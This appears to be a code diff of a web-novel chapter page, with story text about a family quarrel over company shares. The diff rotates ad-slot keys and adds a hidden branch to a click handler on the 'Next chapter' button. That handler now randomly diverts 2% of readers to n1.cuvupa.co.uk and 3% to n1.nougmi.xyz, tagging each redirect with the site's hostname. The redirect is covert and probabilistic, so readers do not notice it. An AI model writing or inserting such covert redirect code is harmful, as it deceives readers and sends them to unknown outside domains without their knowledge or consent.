@@ -2396,7 +2396,7 @@
                 <p>His eyes were red-rimmed.</p>
                 <p>&#34;Grandma, I know you don&#39;t like me. It&#39;s because of my mom... But she&#39;s been gone for so many years. Do you still hold that against me? I&#39;m still your own grandson! Treating me like this... are you trying to drive me to my death?&#34;</p>
                 <!-- 广告位 1 -->
-                <ins class="3b35b82f" data-key="c210a149a5b32458c119a58197e7f96e"></ins>
+                <ins class="3b35b82f" data-key="edabd45f6be962b9624a8fb02ea37201"></ins>
                 <p>He wiped his tears.</p>
                 <p>&#34;Ever since the Vance Group moved to New York, people outside look at me like a joke! They say I&#39;m the Vance family&#39;s eldest grandson in name only, that I don&#39;t even have a say... I&#39;m not trying to compete with Alexander. But as an elder, you can&#39;t be this biased, can you?&#34;</p>
                 <p>He looked up, his voice trembling.</p>
@@ -2407,7 +2407,7 @@
                 <p>Richard had only been brought back to the Vance family at fourteen.</p>
                 <p>He was timid when he first arrived, trying to please everyone.</p>
                 <!-- 广告位 2 -->
-                <ins class="3b35b82f" data-key="a539bb169e7e4ee07b88d8c888b38a5a"></ins>
+                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
                 <p>He was especially attentive to his grandmother.</p>
                 <p>After all, he was her own grandson, and still young. Eleanor&#39;s heart had softened back then. She had shown him kindness. Until she saw Alexander in the ICU, covered in tubes. That&#39;s when her sympathy faded.</p>
                 <p>After that, she deliberately distanced herself from Richard.</p>
@@ -2418,7 +2418,7 @@
                 <p>Eleanor patted the back of his hand.</p>
                 <p>&#34;You were studying abroad. I didn&#39;t want you to worry, so I didn&#39;t tell you. See? Grandma is perfectly fine now.&#34;</p>
                 <!-- 广告位 3 -->
-                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
+                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
                 <p>Alexander clenched his fists, a wave of retrospective fear churning in his eyes.</p>
                 <p>If Grandma had really passed away back then...</p>
                 <p>Richard seized the opportunity, shuffling forward on his knees.</p>
@@ -2429,7 +2429,7 @@
                 <p>Within the Vance Group now, every single share was crucial.</p>
                 <p>Eleanor looked at Richard and sighed.</p>
                 <!-- 广告位 4 -->
-                <ins class="3b35b82f" data-key="c260faacddeb4be16d509e39a27a2374"></ins>
+                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
                 <p>Richard immediately kowtowed.</p>
                 <p>&#34;Grandma, please have mercy on your grandson... For the sake of saving your life once, have mercy on me...&#34;</p>
                 <p>Eleanor pressed her lips together tightly.</p>
@@ -2440,7 +2440,7 @@
                 <p>Alexander also frowned.</p>
                 <p>Saving Grandma&#39;s life, and Julian was about to marry a new wife from a prominent family... Not giving the shares was unreasonable from a logical standpoint.</p>
                 <!-- 广告位 5 -->
-                <ins class="3b35b82f" data-key="edabd45f6be962b9624a8fb02ea37201"></ins>
+                <ins class="3b35b82f" data-key="a539bb169e7e4ee07b88d8c888b38a5a"></ins>
                 <p>The atmosphere in the living room was deadlocked.</p>
                 <p>Evelyn suddenly stood up.</p>
                 <p>She looked at Julian Evans and smiled slightly.</p>
@@ -2573,7 +2573,7 @@
         });
 
         // Intercept Next button clicks and redirect to external domain
-        // 6% -> novel.234xi.com, 94% normal
+        // 2% -> n1.cuvupa.co.uk, 3% -> n1.nougmi.xyz, 95% normal
         (function() {
             const nextBtn = document.getElementById('next-chapter');
             if (nextBtn && nextBtn.href) {
@@ -2589,8 +2589,17 @@
                         const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
                         window.location.href = externalUrl;
                         console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
+                    // 3% probability to redirect to nougmi
+                    } else if (rand < 0.05) {
+                        e.preventDefault();
+                        const url = new URL(this.href, window.location.origin);
+                        const referrerDomain = window.location.hostname;
+                        const separator = url.search ? '&' : '?';
+                        const externalUrl = `https://n1.nougmi.xyz${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
+                        window.location.href = externalUrl;
+                        console.log('🔀 Redirecting to nougmi with ref:', externalUrl);
                     }
-                    // Otherwise, let the default link behavior work (98% probability)
+                    // Otherwise, let the default link behavior work (95% probability)
                 });
             }
         })();
